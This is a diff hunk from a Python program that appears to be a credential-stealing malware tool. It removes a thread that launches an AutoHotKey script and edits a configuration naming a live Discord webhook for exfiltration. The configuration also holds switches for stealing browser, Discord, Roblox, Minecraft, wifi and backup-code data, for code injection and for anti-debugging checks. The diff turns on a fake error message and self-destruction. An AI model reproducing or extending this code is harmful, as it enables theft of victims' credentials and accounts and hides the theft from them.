@@ -22,20 +22,9 @@ from PIL import Image, ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
-def run_ahk_script():
-    script_path = os.path.join(os.path.dirname(__file__), 'ChapkaMolette v5.ahk')
-    executable_path = os.path.join(os.path.dirname(__file__), 'AutoHotKeyA32.exe')
 
-    # Exécuter le script AHK dans un processus séparé
-    subprocess.run([executable_path, script_path])
 
-# Créer un thread pour exécuter le script AHK
-ahk_thread = threading.Thread(target=run_ahk_script)
-
-# Démarrer le thread
-ahk_thread.start()
-
-__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1183465328865460275/THytaxqWy6JAXVG6SuPtUIJ48swiVHw9nE0grX65DcR64Cvl-zT_kOzicxJVsn-CH5-e', 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': True, 'discord': True, 'anti_spam': False, 'self_destruct': False, 'clipboard': False}
+__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1183465328865460275/THytaxqWy6JAXVG6SuPtUIJ48swiVHw9nE0grX65DcR64Cvl-zT_kOzicxJVsn-CH5-e', 'ping': False, 'pingtype': 'Here', 'fakeerror': True, 'startup': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': True, 'discord': True, 'anti_spam': False, 'self_destruct': True, 'clipboard': False}
 
 #global variables
 temp = os.getenv("temp")
